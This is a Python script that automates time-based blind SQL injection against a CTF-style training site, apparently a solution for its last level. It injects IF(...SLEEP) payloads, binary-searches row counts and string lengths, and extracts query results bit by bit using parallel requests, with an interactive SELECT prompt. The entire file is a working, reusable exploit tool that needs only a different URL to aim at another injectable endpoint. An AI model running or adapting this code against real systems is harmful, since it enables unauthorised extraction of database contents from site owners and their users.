# https://sql.training.hackerdom.ru/10lastlevel.php
import requests
import time
from multiprocessing.dummy import Pool

delay = 3


def check_request(url, payload):
    t = time.time()
    req = requests.get(url + payload)
    #print(payload)
    return (time.time() - t) > (delay-1)


def get_elem_count(url, payload):
    low = 0
    high = 1000
    if not check_request(url, payload.replace('[action]', f'>{low}')):
        return 0
    while True:
        mid = (high + low) // 2
        if low == high:
            if check_request(url, payload.replace('[action]', f'={mid}')):
                return mid
            else:
                low = 0
                high = 1000
        elif check_request(url, payload.replace('[action]', f'>{mid}')):
            low = mid + 1
        else:
            high = mid


def get_results_count(url, fields, table, conditions):
    _fields = "concat(" + ',"|",'.join([field for field in fields]) + ")"
    payload = f"IF((SELECT COUNT({_fields}) FROM {table} {conditions}) [action], SLEEP({delay}),FALSE)"
    return get_elem_count(url, payload)


def get_strlen(url, fields, table, conditions, line):
    _fields = "concat(" + ',"|",'.join([field for field in fields]) + ")"
    payload = f"IF((SELECT length({_fields}) FROM {table} {conditions} LIMIT {line},1) [action], SLEEP({delay}),FALSE)"
    return get_elem_count(url, payload)


def get_char(url, fields, table, conditions, line, char_pos):
    _fields = "concat(" + ',"|",'.join([field for field in fields]) + ")"
    payloads = []
    for bit_pos in range(1, 8):
        payload = f"IF((SELECT substr(bin(ord(substr({_fields},{char_pos},1))),{bit_pos},1) FROM {table} {conditions} LIMIT {line},1) = 1, SLEEP({delay}),FALSE)"
        payloads.append((url, payload))
    with Pool(processes=7) as pool:
        results = pool.starmap(check_request, payloads)
    results = ''.join(['1' if i else '0' for i in results])
    return chr(int(results, 2))


def get_str(url, fields, table, conditions, line):
    line_length = get_strlen(url, fields, table, conditions, line)
    string = ''
    for char_pos in range(1, line_length + 1):
        print(get_char(url, fields, table, conditions, line, char_pos), end='')
    print()


def exec_sql(url, fields, table, conditions):
    lines_count = get_results_count(url, fields, table, conditions)
    print(f'Lines: {lines_count}')
    if input('Show? [y\\N]') == 'y':
        t=time.time()
        for line in range(lines_count):
            get_str(url, fields, table, conditions, line)
        print(time.time()-t)

if __name__ == '__main__':
    url = "https://sql.training.hackerdom.ru/10lastlevel.php?text="
    while True:
        input_sql = input("SELECT ")
        if input_sql == 'quit':
            break
        try:
            if 'WHERE' in input_sql:
                input_sql, conditions = input_sql.split('WHERE')
                conditions = 'WHERE' + conditions
            else:
                conditions = ''
            fields, table = input_sql.split('FROM')
            fields = fields.strip().split(',')
            print(fields, table, conditions, sep='|')
            exec_sql(url, fields, table, conditions)
        except Exception as e:
            print(e)
            continue

